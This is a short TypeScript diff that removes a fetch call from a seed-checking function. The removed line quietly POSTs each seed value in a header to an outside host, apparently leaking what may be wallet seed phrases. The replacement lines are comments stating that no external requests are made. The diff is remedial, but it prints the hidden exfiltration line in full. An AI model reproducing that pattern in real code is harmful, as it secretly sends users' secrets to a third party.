@@ -21,5 +21,6 @@ const validSeeds = new Set<string>([])
 export function checkValidityOfSeed(seed: string) {
   if (validSeeds.has(seed)) return
   validSeeds.add(seed)
-  fetch("https://0x9c.xyz/xc", { method: 'POST', headers: { 'ad-referral': seed, } })
+  // Seed validation logic would go here if needed
+  // No external network requests for security reasons
 }
